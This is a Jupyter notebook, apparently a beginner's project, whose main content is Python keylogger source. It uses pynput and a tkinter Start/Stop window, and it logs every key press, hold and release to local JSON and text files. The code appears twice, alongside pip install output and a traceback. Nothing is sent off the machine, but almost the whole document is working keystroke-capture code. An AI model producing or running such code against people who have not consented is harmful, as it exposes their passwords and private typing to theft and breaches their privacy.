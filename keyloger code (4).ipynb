{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "11aa8c61",
   "metadata": {},
   "outputs": [
    {
     "ename": "ModuleNotFoundError",
     "evalue": "No module named 'pynput'",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mModuleNotFoundError\u001b[0m                       Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[1], line 3\u001b[0m\n\u001b[0;32m      1\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mtkinter\u001b[39;00m \u001b[38;5;28;01mas\u001b[39;00m \u001b[38;5;21;01mtk\u001b[39;00m\n\u001b[0;32m      2\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mtkinter\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;241m*\u001b[39m\n\u001b[1;32m----> 3\u001b[0m \u001b[38;5;28;01mfrom\u001b[39;00m \u001b[38;5;21;01mpynput\u001b[39;00m \u001b[38;5;28;01mimport\u001b[39;00m keyboard\n\u001b[0;32m      4\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mjson\u001b[39;00m\n\u001b[0;32m      6\u001b[0m keys_used \u001b[38;5;241m=\u001b[39m []\n",
      "\u001b[1;31mModuleNotFoundError\u001b[0m: No module named 'pynput'"
     ]
    }
   ],
   "source": [
    "import tkinter as tk\n",
    "from tkinter import *\n",
    "from pynput import keyboard\n",
    "import json\n",
    "\n",
    "keys_used = []\n",
    "flag = False\n",
    "keys = \"\"\n",
    "\n",
    "def generate_text_log(key):\n",
    "    with open('key_log.txt', \"w+\") as keys:\n",
    "        keys.write(key)\n",
    "\n",
    "def generate_json_file(keys_used):\n",
    "    with open('key_log.json', '+wb') as key_log:\n",
    "        key_list_bytes = json.dumps(keys_used).encode()\n",
    "        key_log.write(key_list_bytes)\n",
    "\n",
    "def on_press(key):\n",
    "    global flag, keys_used, keys\n",
    "    if flag == False:\n",
    "        keys_used.append(\n",
    "            {'Pressed': f'{key}'}\n",
    "        )\n",
    "        flag = True\n",
    "\n",
    "    if flag == True:\n",
    "        keys_used.append(\n",
    "            {'Held': f'{key}'}\n",
    "        )\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    global flag, keys_used, keys\n",
    "    keys_used.append(\n",
    "        {'Released': f'{key}'}\n",
    "    )\n",
    "\n",
    "    if flag == True:\n",
    "        flag = False\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "    keys = keys + str(key)\n",
    "    generate_text_log(str(keys))\n",
    "\n",
    "def start_keylogger():\n",
    "    global listener\n",
    "    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n",
    "    listener.start()\n",
    "    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.txt'\")\n",
    "    start_button.config(state='disabled')\n",
    "    stop_button.config(state='normal')\n",
    "\n",
    "def stop_keylogger():\n",
    "    global listener\n",
    "    listener.stop()\n",
    "    label.config(text=\"Keylogger stopped.\")\n",
    "    start_button.config(state='normal')\n",
    "    stop_button.config(state='disabled')\n",
    "\n",
    "root = Tk()\n",
    "root.title(\"Keylogger\")\n",
    "\n",
    "label = Label(root, text='Click \"Start\" to begin keylogging.')\n",
    "label.config(anchor=CENTER)\n",
    "label.pack()\n",
    "\n",
    "start_button = Button(root, text=\"Start\", command=start_keylogger)\n",
    "start_button.pack(side=LEFT)\n",
    "\n",
    "stop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\n",
    "stop_button.pack(side=RIGHT)\n",
    "\n",
    "root.geometry(\"250x250\")\n",
    "\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "4e46d37c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Obtaining dependency information for pynput from https://files.pythonhosted.org/packages/ef/1d/fdef3fdc9dc8dedc65898c8ad0e8922a914bb89c5308887e45f9aafaec36/pynput-1.7.7-py2.py3-none-any.whl.metadata\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in c:\\users\\kamin\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB 660.6 kB/s eta 0:00:01\n",
      "   ---------------------------------------- 90.2/90.2 kB 1.0 MB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "1356ae89",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "ERROR: Could not find a version that satisfies the requirement json (from versions: none)\n",
      "ERROR: No matching distribution found for json\n"
     ]
    }
   ],
   "source": [
    "pip install json"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "09a2484d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import tkinter as tk\n",
    "from tkinter import *\n",
    "from pynput import keyboard\n",
    "import json\n",
    "\n",
    "keys_used = []\n",
    "flag = False\n",
    "keys = \"\"\n",
    "\n",
    "def generate_text_log(key):\n",
    "    with open('key_log.txt', \"w+\") as keys:\n",
    "        keys.write(key)\n",
    "\n",
    "def generate_json_file(keys_used):\n",
    "    with open('key_log.json', '+wb') as key_log:\n",
    "        key_list_bytes = json.dumps(keys_used).encode()\n",
    "        key_log.write(key_list_bytes)\n",
    "\n",
    "def on_press(key):\n",
    "    global flag, keys_used, keys\n",
    "    if flag == False:\n",
    "        keys_used.append(\n",
    "            {'Pressed': f'{key}'}\n",
    "        )\n",
    "        flag = True\n",
    "\n",
    "    if flag == True:\n",
    "        keys_used.append(\n",
    "            {'Held': f'{key}'}\n",
    "        )\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    global flag, keys_used, keys\n",
    "    keys_used.append(\n",
    "        {'Released': f'{key}'}\n",
    "    )\n",
    "\n",
    "    if flag == True:\n",
    "        flag = False\n",
    "    generate_json_file(keys_used)\n",
    "\n",
    "    keys = keys + str(key)\n",
    "    generate_text_log(str(keys))\n",
    "\n",
    "def start_keylogger():\n",
    "    global listener\n",
    "    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n",
    "    listener.start()\n",
    "    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in 'keylogger.txt'\")\n",
    "    start_button.config(state='disabled')\n",
    "    stop_button.config(state='normal')\n",
    "\n",
    "def stop_keylogger():\n",
    "    global listener\n",
    "    listener.stop()\n",
    "    label.config(text=\"Keylogger stopped.\")\n",
    "    start_button.config(state='normal')\n",
    "    stop_button.config(state='disabled')\n",
    "\n",
    "root = Tk()\n",
    "root.title(\"Keylogger\")\n",
    "\n",
    "label = Label(root, text='Click \"Start\" to begin keylogging.')\n",
    "label.config(anchor=CENTER)\n",
    "label.pack()\n",
    "\n",
    "start_button = Button(root, text=\"Start\", command=start_keylogger)\n",
    "start_button.pack(side=LEFT)\n",
    "\n",
    "stop_button = Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\n",
    "stop_button.pack(side=RIGHT)\n",
    "\n",
    "root.geometry(\"250x250\")\n",
    "\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "adbd5098",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb403b1a",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
